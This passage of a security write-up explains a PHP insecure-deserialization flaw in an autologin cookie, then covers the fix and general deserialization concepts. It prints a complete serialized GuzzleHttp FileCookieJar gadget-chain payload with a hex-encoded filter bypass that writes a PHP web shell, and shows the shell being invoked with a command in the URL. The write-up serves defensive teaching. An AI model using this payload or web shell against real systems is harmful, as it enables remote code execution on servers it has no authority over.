The filter tries to neutralize them to prevent code injection. A payload like:

```
<?= `$_GET[0]` ?>
```

gets transformed into:

```
&lt;?= `$_GET[0]` ?&gt;
```

→ no longer executable PHP

**The Solution: Hex Encoding!**

Using ```S:``` format again, we encode characters as hex:

```
| Character | Hex   |
| --------- | ----- |
| `<`       | `\3c` |
| `?`       | `\3f` |
| `` ` ``   | `\60` |
| `>`       | `\3e` |
```

Payload:

```
S:15:"\3c\3f=\60$_GET[0]\60\3f\3e"
```

*What is happening?*

1. XSS filter sees only ASCII text → does nothing

2. ```unserialize()``` decodes:

- ```\3c\3f``` → ```<?```

- ```\60``` → backtick

- ```\3f\3e``` → ```?>```

→ payload restored *after filtering*

#### 3. Type Mismatch and ```isset``` Crash:

**The Problem:**

After deserialization, the application checks:

```
isset($data['key'])
```

But what if ```$data``` is not an array? In this case the payload injects a:

```
GuzzleHttp\Cookie\CookieJar
```

object. So:

```
$data['key']
```

→ invalid (object used as array)

*Result (PHP 8):* throws ```TypeError``` and application returns *HTTP 500.*

**Additional Notes:**

The syntax:

```
$data['key']
```

This is *array access* in PHP. And what does ```'key'``` mean? This is just a **string used as an index** into an associative array. Think of PHP arrays like this:

```
$data = [
    'key' => 'some_value',
    'user_id' => 123
];
```

So:

```
$data['key']
```

Means: *“Give me the value stored under the label 'key'.”* Back in the vulnerable code:

```
if (isset($data['key']) and isset($data['user_id'])) {
```

The developer expects ```$data``` to look like:

```
[
    'key' => <something>,
    'user_id' => <something>
]
```

So ```'key'``` is just *a field name the application expects to exist.* Python analogy:

```
data = {
    "key": "some_value",
    "user_id": 123
}

data["key"]
```

Same exact idea. Overall, the application assumes:

```
$data = unserialize($cookie);
```

will produce an **array** like:

```
[
    'key' => ...,
    'user_id' => ...
]
```

But the attacker send a serialized **object** instead:

```
GuzzleHttp\Cookie\CookieJar
```

So after:

```
$data = unserialize($cookie);
```

Now we have:

```
$data  // is an OBJECT, not an array
```

**The Solution: Wrapping the Payload!**

Instead of making ```$data``` directly the malicious object, we wrap it:

```
$data = [
    'key' => 'valid',
    'user_id' => 1,
    'payload' => <malicious object>
];
```

*Why This Works?*

- ```isset($data['key'])``` → passes

- ```isset($data['user_id'])``` → passes

- No crash → application continues

And the magic? Even though the object is nested, its ```__destruct()``` method still executes when garbage collected. Result?

- No HTTP 500

- Application responds normally (e.g., *307 redirect*)

- Malicious code executes silently

Each obstacle forced a deeper adaptation:

- Encoding structure (```S:``` format)

- Encoding syntax (hex-escaped PHP tags)

- Encoding behavior (wrapping object in valid structure)

### The Gadget Chain:

The application includes the *GuzzleHttp* library, which provides a class called ```FileCookieJar```. This class becomes the weapon!

**The Vulnerable Gadget:**

```
class FileCookieJar extends CookieJar
{
    private $filename;
    private $storeSessionCookies;

    public function __destruct()
    {
        $this->save($this->filename);
    }

    public function save(string $filename): void
    {
        $json = [];
        foreach ($this as $cookie) {
            if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
                $json[] = $cookie->toArray();
            }
        }
        if (false === \file_put_contents($filename, Utils::jsonEncode($json), \LOCK_EX)) {
            throw new \RuntimeException("Unable to save file {$filename}");
        }
    }
}
```

**Line-by-Line Breakdown (with Additional Notes):**

***Class Definition:***

```
class FileCookieJar extends CookieJar
```

- ```FileCookieJar``` inherits from ```CookieJar```

- It behaves like a *container of cookies*

- But also has file-saving functionality

***Private Properties:***

```
private $filename;
private $storeSessionCookies;
```

- ```$filename``` → where cookies will be saved

- ```$storeSessionCookies``` → controls filtering logic

These are attacker-controlled via deserialization!

***Destructor:***

```
public function __destruct()
{
    $this->save($this->filename);
}
```

This is the **trigger.** When the object is destroyed:

→ it automatically calls ```save()```

→ using ```$filename``` as the target path

**Additional Notes:**

- ```$this``` = the current instance (object) of the class.

So inside ```class FileCookieJar``` ```$this``` means: *“this specific ```FileCookieJar``` object that currently exists in memory”.*

If the attacker creates an object via ```unserialize()```:

```
$object = new FileCookieJar();
```

Then inside the class:

```
$this === $object
```

The ```->``` is the *object access operator* in PHP. It means: *“access a property or method belonging to this object”.*

*To Summarize:*

```
$this->filename
```

→ access the *property* ```$filename``` of this object

```
$this->save(...)
```

→ call the *method* ```save()``` on this object

Full translation: *“Call the ```save()``` method of this object, and pass it the object’s own ```$filename``` property.”* Meaning: *“Write attacker-controlled data to an attacker-controlled file path.”*

Python analogy:

```
self.save(self.filename)
```

Exactly the same idea!

***Save Method:***

```
public function save(string $filename): void
```

Takes a filename and writes cookie data to it.

**Aditional Notes:**

The colon in function declaration that goes:

```
: void
```

...is a **return type declaration.** In other words: *“This function does NOT return anything.”* So:

- ```string $filename``` → parameter must be a string

- ```: void``` → function returns nothing

*Example comparison (with return value):*

```
public function getName(): string {
    return "Misty";
}
```

→ must return a string

*Without return value:*

```
public function save(...): void {
    // do stuff, return nothing
}
```

**Python analogy?** Python doesn’t enforce this, but conceptually:

```
def save(filename: str) -> None:
    pass
```

→ -> ```None``` ≈ ```: void```

This tells us: *“This function is meant to perform an action, not produce a value.”* And that action is:

```
file_put_contents(...)
```

…which is exactly the dangerous sink.

***JSON Initialization:***

```
$json = [];
```

Prepare an array to hold cookie data.

***Iteration Over Cookies:***

```
foreach ($this as $cookie)
```

- The object is iterable

- Each ```$cookie``` is a cookie object

***Filtering Condition.***

```
if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies))
```

This decides: *“Should this cookie be written to file?”*

**Now… the double colon ```::```**

```
CookieJar::shouldPersist(...)
```

```::``` = **scope resolution operator**, used to access:

- static methods

- constants

- class-level stuff (not tied to an instance)

*Compare with ```->```*

```
| Syntax | Meaning                    |
| ------ | -------------------------- |
| `->`   | instance (object-specific) |
| `::`   | class-level (static)       |
```

In this example:

```
CookieJar::shouldPersist($cookie, $this->storeSessionCookies)
```

means: *“Call the ```shouldPersist()``` method that belongs to the class itself, not a specific object.”*

**Python analogy:**

```
CookieJar.shouldPersist(cookie, storeSessionCookies)
```

*Why use ```::``` here?* Because ```shouldPersist()```:

- doesn’t depend on a specific object instance

- just evaluates inputs

So it’s defined as a *static method*

In other words:

- ```$this->something``` → *“my personal property/method”*

- ```Class::something``` → *“belongs to the class itself”*

- ```: void``` → *“I act, I don’t return”*

***Adding Cookie Data:***

```
$json[] = $cookie->toArray();
```

- Convert cookie → array

- Add to JSON structure

***Writing to File:***

```
file_put_contents($filename, Utils::jsonEncode($json), LOCK_EX)
```

This is the *sink:*

- ```$filename``` → attacker-controlled path

- ```$json``` → attacker-influenced content

**Additional Notes:**

*1. The ```===``` (triple equals):*

```
false === file_put_contents(...)
```

```===``` = **strict comparison!** It checks *value* and *type.*

*Why not just ```==```?*

```==``` is loose comparison, and PHP does *weird stuff* here. Example:

```
0 == false   // true
"" == false  // true
```

So if ```file_put_contents()``` returned:

```
0   // valid: wrote 0 bytes
```

Then:

```
0 == false  → true (wrong!)
```

With ```===```:

```
0 === false → false
```

So:

```===``` ensures we only catch an *actual failure,* not a valid result.

*2. What is ```LOCK_EX```?*

```
file_put_contents(..., LOCK_EX)
```

```LOCK_EX``` = **exclusive file lock.** It means: *“Lock this file while writing so nothing else can modify it at the same time.”* This prevents:

- race conditions

- corrupted writes

- overlapping writes

*3. But wait: why the backslashes ```\``` everywhere?*

Earlier we saw:

```
\file_put_contents
\LOCK_EX
\RuntimeException
```

This refers to the **global namespace.** PHP supports namespaces like:

```
namespace MyApp;
```

Inside that, if you write:

```
file_put_contents(...)
```

PHP will first look for:

```
MyApp\file_put_contents
```

But that function *actually lives* in:

```
\file_put_contents   (global namespace)
```

So this:

```
\file_put_contents(...)
```

means: *“Don’t search—use the built-in global function directly.”*

*Same for others!*

```\LOCK_EX```:

- global constant

- avoids namespace confusion

```\RuntimeException```:

```
throw new \RuntimeException(...)
```

means: *“Use the built-in PHP exception class, not some namespaced version.”*

*Why developers do this?* Two reasons:

1. Clarity:

→ explicitly use PHP built-ins

2. Performance:

→ skip namespace lookup

*Putting it all together:*

```
if (false === \file_put_contents(...)) {
    throw new \RuntimeException(...)
}
```

Means: *“If writing the file truly failed (not just returned 0), throw a standard PHP exception.”*

**Hmm... And What Actually Happens?**

When the object is destroyed:

```
__destruct() → save() → file_put_contents()
```

So the attacker controls *where the file is written* and *what content goes into it.*

**The Filtering Condition:**

The article mentions: *“The ```shouldPersist()``` check requires either ```Expires``` to be set or ```storeSessionCookies``` to be true, and ```Discard``` to be false.”* Let’s translate to that into something clearer: a cookie will be saved if it has an **expiration date** OR ```$storeSessionCookies = true``` AND ```Discard = false```.

**Attacker Strategy:**

Set cookie properties so that:

- It passes ```shouldPersist()```

- It gets included in ```$json```

**The Payload Injection:**

```
$json[] = $cookie->toArray();
```

This includes cookie fields like:

```
Name, Value, Domain, etc.
```

**Critical Field: ```Name```**

The attacker sets:

```
Name = <?=`$_GET[0]`?>
```

**Resulting File:**

```
[{"Name":"<?=`$_GET[0]`?>","Value":"x","Domain":"localhost"}]
```

**Why This Works?**

At first glance, this is just JSON. But when the file is requested through the web server, PHP scans the file and it looks for ```<? ... ?>``` tags.

**The Trick:**

```
<?=`$_GET[0]`?>
```

is a *PHP short echo tag* equivalent to:

```
<?php echo `$_GET[0]`; ?>
```

**What does this do?**

```
`$_GET[0]`
```

Executes a system command from the URL. Example: ```?0=id``` → executes: ```id```.

**Why JSON Doesn’t Stop It?**

PHP ignores everything except the tag:

```
[{"Name":"   <?=`$_GET[0]`?>   ","Value":"x"}]
```

PHP sees:

```
<?=`$_GET[0]`?>
```

…and executes it!

*Let’s connect everything:*

1. Attacker sends serialized payload via cookie

2. ```unserialize()``` creates ```FileCookieJar``` object

3. Object lives briefly…

4. Script ends → ```__destruct()``` fires

5. ```save()``` writes attacker-controlled file

6. File contains PHP payload

7. Attacker requests file via browser

8. PHP executes embedded code

Overall, it’s a **chain reaction:**

- Deserialization → object creation

- Object lifecycle → destructor trigger

- Library feature → file write

- Data field → code injection

### Proof of Concept With Full Payload Breakdown:

```
a:3:{                             <- array wrapper (to avoid TypeError)
  s:3:"key";s:1:"x";              <- satisfies isset($data['key'])
  s:7:"user_id";s:1:"1";          <- satisfies isset($data['user_id'])
  s:3:"jar";
  O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{
    S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies";
           ^^^          ^^^     ^^^          ^^^
         null byte   backslash            null byte

    a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{
      S:33:"\00GuzzleHttp\5cCookie\5cSetCookie\00data";
      a:9:{
        s:4:"Name";
        S:15:"\3c\3f=\60$_GET[0]\60\3f\3e";
              ^^^^     ^^^^      ^^^^
               <?       `        ?>
        s:5:"Value";s:1:"x";
        s:6:"Domain";s:9:"localhost";
        s:4:"Path";s:1:"/";
        s:7:"Max-Age";N;
        s:7:"Expires";i:9999999999;
        s:6:"Secure";b:0;
        s:7:"Discard";b:0;
        s:8:"HttpOnly";b:0;
      }
    }}
    S:39:"\00GuzzleHttp\5cCookie\5cCookieJar\00strictMode";b:0;
    S:41:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00filename";
    s:31:"filename.php";
    S:52:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00storeSessionCookies";
    b:1;
  }
}
```

This payload is sent via the ```autologin``` **cookie** in an HTTP request! Example:

```
Cookie: autologin=<serialized_payload_here>
```

When the application calls:

```
get_cookie('autologin', true)
```

→ your payload is retrieved, passed into ```unserialize()``` and the chain begins!

**High-Level Structure:**

```
a:3:{ ... }
```

This means: *“Create an array with 3 elements.”*

**1. Wrapper Array (Type Safety Bypass):**

```
a:3:{
  s:3:"key";s:1:"x";
  s:7:"user_id";s:1:"1";
  s:3:"jar"; ...
}
```

*Breakdown (Key #1):*

```
s:3:"key";s:1:"x";
```

- ```s:3:"key"``` → string ```"key"```

- ```s:1:"x"``` → value ```"x"```

This satisfies ```isset($data['key'])```.

*Key #2:*

```
s:7:"user_id";s:1:"1";
```

This satisfies ```isset($data['user_id'])```.

*Key #3:*

```
s:3:"jar"; ...
```

→ this holds the **malicious object!**

**2. The Injected Object:**

```
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{ ... }
```

Meaning:

- ```O:31``` → object, class name length = 31

- ```"GuzzleHttp\Cookie\FileCookieJar"``` → class name

- ```:4:``` → 4 properties

**3. Private Property: ```cookies```:**

```
S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies";
```

This represents ```\x00ClassName\x00property``` meaning ```private $cookies```.

*Important Encodings:*

- ```\00``` → NULL byte

- ```\5c``` → ```\``` (namespace separator)

**4. Cookie Array:**

```
a:1:{
  i:0;
  O:27:"GuzzleHttp\Cookie\SetCookie":1:{ ... }
}
```

Meaning: array with 1 element, index ```0```, contains a ```SetCookie``` object.

**5. Inner Object: ```SetCookie```:**

```
O:27:"GuzzleHttp\Cookie\SetCookie":1:{ ... }
```

This represents a single cookie.

**6. Private Property: ```data```:**

```
S:33:"\00GuzzleHttp\5cCookie\5cSetCookie\00data";
```

→ internal cookie data storage

**7. Cookie Fields (CRITICAL PART):**

```
a:9:{
```

Meaning 9 properties inside the cookie.

*The Payload:*

```
s:4:"Name";
S:15:"\3c\3f=\60$_GET[0]\60\3f\3e";
```

Decoded:

```
\3c\3f      → <?
\60         → backtick `
\3f\3e      → ?>
```

So: ```<?=`$_GET[0]`?>```

Meaning:

- ```<?= ... ?>``` → echo output

- ```$_GET[0]``` → execute system command

**8. Supporting Fields (Bypass Conditions):**

```
s:7:"Expires";i:9999999999;
s:7:"Discard";b:0;
```

Ensures ```shouldPersist()``` returns true.

**9. File Path Control:**

```
S:41:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00filename";
s:31:"filename.php";
```

Meaning:

```
$this->filename = "filename.php";
```

Attacker controls output file name.

**10. Final Property:**

```
storeSessionCookies = true
```

Ensures persistence logic passes.

Also:

```
b:1;
```

This is **NOT part of the cookie itself!** It’s a property of the ```FileCookieJar``` **object:**

```
private $storeSessionCookies = true;
```

So: ```b:1;``` → boolean ```true```. *But why this matters?*

Earlier logic:

```
CookieJar::shouldPersist($cookie, $this->storeSessionCookies)
```

This function basically says: *“Should we save this cookie?”*

A cookie is saved if: it has ```Expires``` set OR ```storeSessionCookies == true``` AND ```Discard == false```.

This payload **double-guarantees success:**

1. Inside cookie:

```
Expires = 9999999999
Discard = false
```

2. At object level:

```
storeSessionCookies = true
```

Think of it like this:

- Cookie says: *“I’m valid, don’t discard me!”*

- Object says: *“Even if it’s a session cookie… keep it anyway!”*

So the attacker isn’t relying on just one condition; they’re stacking guarantees.

### Full Chain Execution (let’s replay it like a timeline):

**1. Request arrives:**

```
Cookie: autologin=<payload>
```

**2. Application processes it:**

```
$data = unserialize($cookie);
```

**3. Object is created:**

```
FileCookieJar object
```

With attacker-controlled properties.

**4. Script ends:**

```
__destruct() triggers
```

**5. File write occurs:**

```
file_put_contents("filename.php", <json_with_payload>)
```

**6. Attacker visits:**

```
http://target/filename.php?0=id
```

**7. PHP executes payload:**

```
<?=`$_GET[0]`?>
```

*PHP ignores JSON structure:*

```
[{"Name":"<?=`$_GET[0]`?>"}]
```

It only sees:

```
<?=`$_GET[0]`?>
```

This payload is **perfectly shaped to satisfy every constraint:**

- Passes ```isset()``` checks

- Survives XSS filtering

- Bypasses NULL byte stripping

- Avoids parser errors

- Satisfies ```shouldPersist()```

- Triggers destructor

- Writes executable PHP

### Remediation and Fixing the Root Cause:

The vulnerability existed because of this deadly pattern:

```
unserialize($cookie);
```

Here comes the patched ```autologin()```:

```
public function autologin()
{
    if (! is_logged_in()) {
        $this->load->helper('cookie');
        if ($cookie = get_cookie('autologin', true)) {
            $data = json_decode($cookie, true);

            if (! is_array($data)) {
                delete_cookie('autologin', 'aal');
                return false;
            }

            if (isset($data['key']) and isset($data['user_id'])) {
                if (! is_numeric($data['user_id']) || ! is_string($data['key'])) {
                    delete_cookie('autologin', 'aal');
                    return false;
                }

                if (! is_null($user = $this->user_autologin->get(
                    $data['user_id'], hash('sha256', $data['key'])
                ))) {
                    // ...login proceeds
```

**The Core Fix:**

```
$data = json_decode($cookie, true);
```

*But why?*

- ```unserialize()``` → can create objects

- ```json_decode()``` → creates only: arrays, strings, numbers, booleans. *No object instantiation possible!*

JSON is *data-only* and PHP serialization is *code-capable.*

#### Patched ```autologin()``` Breakdown:

*1. Entry Point (unchanged logic):*

```
if (! is_logged_in()) {
```

Only attempt autologin if user is not already authenticated.

**2. Retrieve Cookie:**

```
$this->load->helper('cookie');

if ($cookie = get_cookie('autologin', true)) {
```

Same behavior as before. Still uses XSS filtering.

**3. Safe Decoding:**

```
$data = json_decode($cookie, true);
```

*What does ```true``` do?* Forces JSON → **associative array**

Without it:

```
json_decode(...) → object
```

With it:

```
json_decode(..., true) → array
```

**4. Type Validation — First Barrier:**

```
if (! is_array($data)) {
    delete_cookie('autologin', 'aal');
    return false;
}
```

Because even JSON decoding can fail:

```
json_decode("garbage") → null
```

So: *“If this isn’t an array → reject immediately!”* In other words, defensive move: delete malicious cookie and stop execution early.

**Additional Notes:**

This line here:

```
delete_cookie('autologin', 'aal');
```

Is ```'aal'``` some value? A flag? A secret sauce? Actually no, it’s much more mundane. Let's put it this way: what ```delete_cookie()``` expects?

In CodeIgniter, the function signature is roughly:

```
delete_cookie($name, $domain = '', $path = '/', $prefix = '')
```

So, it’s being passed as the *domain parameter.* So effectively:

```
delete_cookie(
    'autologin',  // cookie name
    'aal'         // domain (probably wrong / placeholder-ish)
);
```

Overall, to delete a cookie, PHP needs to match name, domain, path. If these don’t match the original cookie the deletion might silently fail.

**5. Required Fields Check:**

```
if (isset($data['key']) and isset($data['user_id'])) {
```

Same logical requirement as before now operating on **safe data!**

**6. Type Enforcement — Second Barrier:**

```
if (! is_numeric($data['user_id']) || ! is_string($data['key'])) {
    delete_cookie('autologin', 'aal');
    return false;
}
```

*But why?* Previously, attacker could inject *anything* (objects, arrays, etc). Now: ```user_id``` must be numeric and ```key``` must be string. This kills object injection, type confusion and weird edge cases.

**Additional Notes:**

In PHP: ```||``` is *logical OR.*

AND in PHP would be:

```
&&   // or the keyword: and
```

Both mean AND, but:

- ```&&``` has higher precedence

- ```and``` is lower precedence

Now, the snippet again:

```
if (isset($data['key']) and isset($data['user_id'])) {

    if (! is_numeric($data['user_id']) || ! is_string($data['key'])) {
        delete_cookie('autologin', 'aal');
        return false;
    }
}
```

Breakdown (for clarity):

*Step 1: Check existence*

```
isset($data['key']) and isset($data['user_id'])
```

Meaning: *“Do both fields exist?”* Only if *both are present,* we continue.

*Step 2: Validate types*

```
! is_numeric($data['user_id']) || ! is_string($data['key'])
```

This reads as: *“If user_id is NOT numeric OR key is NOT a string → reject”*

**7. Secure Lookup:**

```
$user = $this->user_autologin->get(
    $data['user_id'],
    hash('sha256', $data['key'])
);
```

Improvements here:

- ```key``` is hashed before use

- prevents raw token abuse

- ensures consistent format

**8. Final Check:**

```
if (! is_null($user)) {
```

Only proceed if valid user found!

**Additional Notes:**

The snippet:

```
if (! is_null($user = $this->user_autologin->get(
    $data['user_id'], hash('sha256', $data['key'])
)))
```

*First: what is ```get()```?* This is *not a built-in PHP function.* It’s a *method defined in the application’s model:*

```
$this->user_autologin
```

So:

```
$this->user_autologin->get(...)
```

Meaning: *“Call the ```get()``` method from the ```user_autologin``` model.”*

*What does ```get()``` likely do?* Based on context, it probably queries the database, looks for a user with matching ```user_id``` and matching hashed key.

Conceptual version:

```
function get($user_id, $hashed_key) {
    // query database
    // return user object if found
    // return null if not found
}
```

**Now the full line breakdown:**

*1. Inner call:*

```
$this->user_autologin->get(
    $data['user_id'],
    hash('sha256', $data['key'])
)
```

What is ```hash()``` doing?

```
hash('sha256', $data['key'])
```

It converts the key into a *SHA-256 hash.* So instead of comparing raw values we compare something like ```2bb80d537b1da3e38bd30361aa855686bde0...```

*2. Assignment inside condition:*

```
$user = ...
```

This assigns the result of ```get()``` to ```$user```.

*3. Null check:*

```
! is_null($user)
```

Meaning: *“Did we actually find a user?”* So the whole line means: *“Try to fetch a user using ```user_id``` and hashed key. If a user is found (not null), continue.”*

But wait: *why combine assignment + condition?* Classic PHP shortcut. Instead of:

```
$user = $this->user_autologin->get(...);

if (! is_null($user)) {
```

They compress it into:

```
if (! is_null($user = ...)) {
```

*Python analogy:*

```
if (user := get(user_id, hash_key)) is not None:
    ...
```

Same idea using the walrus (```:=```) operator (it allows you to assign a value to a variable as part of an expression, making your code more concise and readable).

Overall, this line ensures: user exists and key matches stored hash. So even if someone sends:

```
user_id = 1
key = "random garbage"
```

→ hash won’t match

→ ```get()``` returns null

→ login fails

**To Summarize (What Changed):**

Before (vulnerable):

```
User input → unserialize() → object → __destruct() → RCE
```

After (patched):

```
User input → json_decode() → array → validation → safe usage
```

### Patched ```create_autologin()``` — Secure Token Generation:

This function is responsible for *creating the autologin cookie* in a safe way.

```
private function create_autologin($user_id, $staff)
{
    $this->load->helper('cookie');

    $key = bin2hex(random_bytes(32));

    $this->user_autologin->delete($user_id, $key, $staff);

    if ($this->user_autologin->set($user_id, hash('sha256', $key), $staff)) {

        set_cookie([
            'name'  => 'autologin',
            'value' => json_encode([
                'user_id' => $user_id,
                'key'     => $key,
            ]),
            'expire' => 60 * 60 * 24 * 31 * 2,
        ]);

        return true;
    }

    return false;
}
```

**Breakdown (for clarity):**

**1. Load Cookie Helper:**

```
$this->load->helper('cookie');
```

Enables ```set_cookie()``` and related functions.

**2. Generate Secure Token:**

```
$key = bin2hex(random_bytes(32));
```

What’s happening here? First, we have ```random_bytes(32)```:

- Generates *32 cryptographically secure random bytes*

- Not predictable & not guessable

We also have ```bin2hex(...)```: converts binary → readable hex string. Example:

```
\xA3\xF1 → "a3f1"
```

Final result: 64-character hex string. This is good because:

- High entropy (256-bit)

- Safe for storage and transport

- No weird characters

**3. Remove Old Tokens:**

```
$this->user_autologin->delete($user_id, $key, $staff);
```

Why? Prevent multiple valid tokens, reduce attack surface, enforce *one active token per user.*

**4. Store Token (Hashed):**

```
$this->user_autologin->set(
    $user_id,
    hash('sha256', $key),
    $staff
)
```

Important: the raw ```$key``` is *NOT stored!* Instead:

```
stored_value = SHA256(key)
```

Why is this good? If database is compromised: attacker sees only hash and cannot directly use it. Same principle as password hashing (simplified).

**5. Create Cookie:**

```
set_cookie([
    'name'  => 'autologin',
    'value' => json_encode([
        'user_id' => $user_id,
        'key'     => $key,
    ]),
    'expire' => 60 * 60 * 24 * 31 * 2,
]);
```

**Key Improvements? JSON instead of serialization:**

```
json_encode([...])
```

- No object injection possible

- Strict data format

*Expiration:*

```
60 * 60 * 24 * 31 * 2
```

→ ~2 months

**6. Return Value:**

```
return true;
```

**Additional Notes:**

This block warrants a closer look:

```
if ($this->user_autologin->set($user_id, hash('sha256', $key), $staff)) {

    set_cookie([
        'name'  => 'autologin',
        'value' => json_encode([
            'user_id' => $user_id,
            'key'     => $key,
        ]),
        'expire' => 60 * 60 * 24 * 31 * 2,
    ]);

    return true;
}

return false;
```

**The ```set(...)``` Call — Parentheses Mystery:**

```
$this->user_autologin->set($user_id, hash('sha256', $key), $staff)
```

What’s actually happening? This is just a function call with *3 arguments.*

*Argument 1:*

```
$user_id
```

→ which user

*Argument 2:*

```
hash('sha256', $key)
```

→ hashed version of the token

*Argument 3:*

```
$staff
```

→ Likely a flag like: admin vs user or staff vs client.

So the parentheses are simply: ```set( arg1, arg2, arg3 )```.

→ ```$staff``` is inside the function call, not outside.

*Why it looks confusing?* Because of nesting:

```
set(
    $user_id,
    hash('sha256', $key),   // ← inner function
    $staff
)
```

So visually: ```set( ..., hash(...), ... )```

In other words:

```
$result = set(user_id, hashed_key, staff_flag);
```

**The ```if``` Condition Logic:**

This checks: *“Did ```set()``` succeed?”*

Meaning of ```set()```? Likely writes token to database and returns: ```true``` → success, ```false``` → failure. So:

```
IF token successfully stored → create cookie
ELSE → fail
```

**3. Cookie Creation Logic:**

Only happens *if database storage succeeds:*

```
set_cookie([...]);
return true;
```

Why this matters? *Don’t give client a token unless server successfully stored it.* Otherwise client holds unusable token = inconsistent state.

**4. The Expiration Math:**

```
'expire' => 60 * 60 * 24 * 31 * 2
```

In greater detail:

```
60 seconds  = 1 minute
60 * 60     = 3600 seconds (1 hour)
3600 * 24   = 86400 seconds (1 day)
86400 * 31  = 2,678,400 seconds (~1 month)
× 2         = 5,356,800 seconds (~2 months)
```

Final result: ```~5.3 million seconds ≈ 62 days```

So, instead of:

```
'expire' => 5356800
```

They write:

```
60 * 60 * 24 * 31 * 2
```

Much more readable: *“2 months”*

**Final Flow (Putting It Together):**

*Step 1:*

```
set(...)
```

*Step 2:*

If success:

```
set_cookie(...)
```

→ send token to client

*Step 3:*

```
return true;
```

*Step 4:*

If failure:

```
return false;
```

→ nothing happens

This block enforces a **tight contract:** *“I will only trust you with a token if I have already secured it on my side.”*

**So, what changed? Before (vulnerable):**

```
Predictable / weak token
Serialized object
Direct unserialize()
```

- client sends → server trusts

**After (secure):**

```
Strong random token
Hashed before storage
JSON encoding
Strict validation on read
```
- server generates → stores → THEN shares

**Key Improvements?**

**1. Strong randomness:**

```
random_bytes(32)
```

→ eliminates guessability

**2. Safe encoding:**

```
json_encode(...)
```

→ no object injection

**3. Hashing tokens:**

```
hash('sha256', $key)
```

→ protects stored values

**4. Validation (from previous section):**

```
is_array()
is_numeric()
is_string()
```

→ ensures structure integrity

The system now follows a **split-trust model:**

- Client stores → raw token (```key```)

- Server stores → hashed token

So authentication becomes: ```hash(client_key) == stored_hash```

### Moral of the Story (When Data Starts Thinking):

At first glance, this vulnerability looks almost trivial: *“A cookie is passed into ```unserialize()```.”*

But that single decision quietly breaks a fundamental boundary: data stops being data and becomes **behavior.**

**The Core Sin:**

The application trusted that a string from the outside world could be safely interpreted as something internal. But PHP serialization doesn’t just describe data; it describes **objects**, and objects carry: properties, methods, lifecycles, and sometimes side effects on destruction.

An attacker didn’t “inject code” in the traditional sense. They constructed an object, shaped its internal state and let the application *execute its own logic.* In other words: *“Here’s an object. You know what to do.”*

Even when defenses appeared:

- XSS filtering

- null byte stripping

- type checks

They failed because they were fighting symptoms, not the disease.

The patch didn’t try to “sanitize serialization.” It did something far more powerful: *it removed the idea that user input could ever become an object.* By switching to JSON data stayed data, structure became predictable and behavior was no longer injectable.

This wasn’t just about PHP. The real conclusion is: *never let external input define internal behavior.* Because the moment it does, you’re no longer writing the program (something else is).

**The Quiet Contrast:**

Before: objects appear out of thin air, destructors execute silently, files get written in the background.

After: arrays, strings, validation, rejection.

***Remember this story if you ever feel tempted to reach for ```unserialize()``` on user input!***

## Insecure Deserialization — Insights from OWASP & PortSwigger:

After dissecting and thoroughly understanding our initial case study, I felt the need to push further. I turned to OWASP and PortSwigger to deepen my perspective and uncover additional nuances of insecure deserialization. In the sections that follow, I bring together the most relevant concepts and insights refined into a cohesive and practical overview.

**Insecure Deserialization — Core Concepts:**

Insecure deserialization is a vulnerability that occurs when an application accepts serialized data from an untrusted source and processes it without proper validation. Instead of treating this data as dangerous, the application blindly reconstructs objects—allowing an attacker to manipulate program logic, trigger unintended behavior, or even achieve remote code execution (RCE). At its core, this is not just “data handling gone wrong”—it’s *trusting structure and behavior embedded inside user-controlled input.*

To understand the vulnerability, we first need to break down the mechanics (again).

- **Serialization:** Converts an object into a storable or transmittable format (e.g., saving to disk, caching in memory, sending over a network).

- **Deserialization:** Reconstructs the original object from that serialized data.

Example:

```
$user = new User("Misty", "admin");

// Serialization
$serialized = serialize($user);

// Deserialization
$restored = unserialize($serialized);
```

If an attacker controls ```$serialized```, they control what gets reconstructed—and potentially what gets executed. Many programming languages provide *native serialization mechanisms* that go far beyond simple formats like JSON or XML. These native formats often support:

- Complex object graphs

- Private/protected properties

- Custom behavior during deserialization

- Automatic method invocation (magic methods, hooks, etc.)

And that’s where things go sideways. When untrusted data is deserialized:

- Objects may be instantiated unexpectedly

- Internal state can be manipulated

- Special methods may execute automatically

This opens the door to:

- Remote Code Execution (RCE)

- Access control bypass

- Data tampering

- Denial of Service (DoS)

### PHP Serialization:

PHP uses a *text-based, mostly human-readable format.* Serialized values contain:

- Type identifiers (```s```, ```i```, ```a```, ```O```, etc.)

- Length indicators

- Structured object/property data

Example:

```
class User {
    public $name = "Misty";
}

echo serialize(new User());
```

Output:

```
O:4:"User":1:{s:4:"name";s:5:"Misty";}
```

Key Functions:

```
serialize($object);
unserialize($data);
```

If you have source code access, search for ```unserialize(...)```. Then ask:

- Is the input user-controlled?

- Is there any validation or filtering?

- What classes are available during deserialization?

Because this is the moment where *data turns into behavior.*

### Java Serialization:

Unlike PHP, Java uses a *binary serialization format,* which is not human-readable. However, it has recognizable fingerprints.

**Magic Bytes:**

Serialized Java objects always begin with:

- Hex: ```ac ed```

- Base64: ```rO0```

If you see this in traffic, logs, or cookies—you’ve likely found serialized Java data. Example:

```
ObjectInputStream in = new ObjectInputStream(inputStream);
Object obj = in.readObject();
```

**Additional Notes:**

1. ```ObjectInputStream in```:

- ```ObjectInputStream``` → a *class* provided by Java

- ```in``` → a *variable* (an instance of that class)

So this line:

```
ObjectInputStream in = ...
```

Means: *“Create a tool called ```in``` that knows how to read serialized objects.”*

2. ```new ObjectInputStream(inputStream)```:

- ```new``` → creates a new object (instance)

- ```ObjectInputStream(...)``` → constructor (initializes the object)

- ```inputStream``` → *data source* (VERY important)

That ```inputStream``` could be a file, a network socket, an HTTP request body or attacker-controlled data if you're unlucky.

So this becomes: *“Take raw incoming data and prepare to interpret it as serialized Java objects.”*

3. ```in.readObject()```:

- ```in``` → your ```ObjectInputStream``` instance

- ```readObject()``` → a *method* (function attached to the object)

This is the critical moment!

```
Object obj = in.readObject();
```

Means: *“Read bytes from the input stream… and reconstruct a Java object from them.”* Putting it together:

- Data enters via ```inputStream```

- ```ObjectInputStream``` prepares to interpret it
